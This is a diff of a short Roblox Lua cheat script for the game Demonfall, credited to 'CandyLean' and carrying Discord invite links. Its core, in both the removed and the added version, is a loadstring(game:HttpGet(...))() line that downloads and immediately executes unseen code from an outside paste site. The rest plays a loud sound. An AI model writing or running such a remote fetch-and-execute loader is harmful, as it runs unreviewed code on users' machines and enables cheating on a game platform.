@@ -1,20 +1,10 @@
---Demonfall Update: 4.00 v2
---By CandyLean#2645
---Hello Whos Looking Lel, Very Gud Menu Yesh?~
---Discord: https://discord.gg/WdtXKgNPGJ
 
+--[[
+--Made By CandyLeanV2
+--https://discord.gg/MAVYmJWwnQ
+--]]
 
-local Sound = Instance.new("Sound",game:GetService("SoundService"))
-Sound.SoundId = "rbxassetid://6695903063"
-Sound.Volume = 10
-Sound:Play();
-
-local Sound = Instance.new("Sound",game:GetService("SoundService"))
-Sound.SoundId = "rbxassetid://6695903063"
-Sound.Volume = 10
-Sound:Play();
-
-loadstring(game:HttpGet("https://api.upload.systems/pastes/1mkQHC9oMBXL/raw",true))();
+loadstring(game:HttpGet("https://furrying.lol/p/raw/rercnt5el6",true))()
 local Sound = Instance.new("Sound",game:GetService("SoundService"))
 Sound.SoundId = "rbxassetid://6695903063"
 Sound.Volume = 10
